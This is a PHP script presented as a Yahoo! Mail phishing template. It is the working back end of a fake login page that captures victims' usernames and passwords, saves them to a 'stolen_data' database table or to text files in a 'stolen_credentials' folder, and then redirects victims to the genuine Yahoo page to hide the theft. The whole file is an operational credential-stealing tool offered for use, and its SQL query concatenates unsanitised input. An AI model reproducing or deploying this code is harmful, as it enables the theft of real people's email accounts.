<?php
/**
*MIT License
*
*Copyright (c) 2022 It0sh1
*Permission is hereby granted, free of charge, to any person obtaining a copy
*of this software and associated documentation files (the "Software"), to deal
*in the Software without restriction, including without limitation the rights
*to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
*copies of the Software, and to permit persons to whom the Software is
*furnished to do so, subject to the following conditions:
*
*(The above copyright notice and this permission notice shall be included in all
*copies or substantial portions of the Software.
*THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,&*
*FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*SOFTWARE.
*/
/************************************/
# Phishingtemplates /Yahoo! mail     #
# author: It0sh1                     #
# github: https://github.com/it0sh1  #
/*************************************/

# Include config
require_once('conf.inc.php');

// writing class for phishing
class Phish
{

  // making redirect function
  public static function redirect(string $url)
  {
    // set header
    header('Location:'.$url.'');
  }

  // making phishing function
  public static function GetPhished()
  {

    // import some vars
    GLOBAL $db_host;
    GLOBAL $db_user;
    GLOBAL $db_pass;
    GLOBAL $db_name;
    GLOBAL $use_db;
    GLOBAL $yahoo_link;

    // when user presses login button
    if(isset($_POST['signin']))
    {

      // victim input:
      $yahoo_mail = htmlentities($_POST['username']);
      $yahoo_pass = htmlentities($_POST['passwd']);

      // when $use_db is true:
      if($use_db === true)
      {

        // make connection
        $connecting = mysqli_connect("$db_host", "$db_user", "$db_pass", "$db_name")
        or die('Connection failed bitch :(').mysqli_connect_error();

        // making sql query
        $sql = "INSERT INTO stolen_data(stolen_username, stolen_password)
        VALUES ('$yahoo_mail', '$yahoo_pass');";

        // when SQL succeed and is true:
        if(mysqli_query($connecting, $sql) === true)
        {
          // redirect victim to the official page
           self::redirect($yahoo_link);
           exit; // EXIT SCRIPT

        // on fail:
        } else {

          // print error:
          print("Something went wrong. :(. Check the error: ").mysqli_connect_error();
        }

      // when $use_db is false:
    } else {

      // make folder to put our stolen credentials in in
      $stolen_user_credential_folder = "stolen_credentials/";

      // check if stolen_credentials folder not exists:
      if(!is_dir($stolen_user_credential_folder))
      {

        // make folder
        mkdir($stolen_user_credential_folder);

        // creating .txt with random hashed name
        $randomhashtextfile = uniqid().'.txt';

        // now we making filehandler to put our credentials in it
        $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

        // creating text
        $data1 = "Username/Email: " . $yahoo_mail . "\n";
        fwrite($filehandler, $data1);

        // second text
        $data2 = "Password: " . $yahoo_pass . "\n";
        fwrite($filehandler, $data2);
        // close handler
        fclose($filehandler);

        // redirect victim to official login page
        self::redirect($yahoo_link);
        exit; // EXIT SCRIPT

      // when folder already exists
      } else {

        // creating .txt with random hashed name
        $randomhashtextfile = uniqid().'.txt';

        // making filehandler again
        $filehandler = fopen($stolen_user_credential_folder.$randomhashtextfile, 'w');

        // creating text
        $data1 = "Username/Email: " . $yahoo_mail . "\n";
        fwrite($filehandler, $data1);

        // second data text
        $data2 = "Password: " . $yahoo_pass . "\n";
        fwrite($filehandler, $data2);
        // close handler
        fclose($filehandler);

        self::redirect($yahoo_link);
        exit; // EXIT SCRIPT
        }
      }
    }
  }
}
// call class and function
Phish::GetPhished();
